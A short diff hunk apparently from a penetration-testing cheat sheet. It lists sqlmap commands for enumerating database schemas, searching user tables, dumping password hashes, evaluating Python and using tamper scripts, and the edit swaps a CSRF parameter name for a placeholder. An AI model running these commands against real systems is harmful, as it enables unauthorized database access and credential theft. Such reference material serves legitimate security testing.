@@ -677,7 +677,7 @@ $ sqlmap -u <URL> --schema
 $ sqlmap -u <URL>--search -T user
 $ sqlmap -u <URL> --passwords --batch
 $ sqlmap -u <URL> --passwords --batch --all
-$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<CSRF token parameter>"
 $ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
 $ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
 $ sqlmap --list-tampers
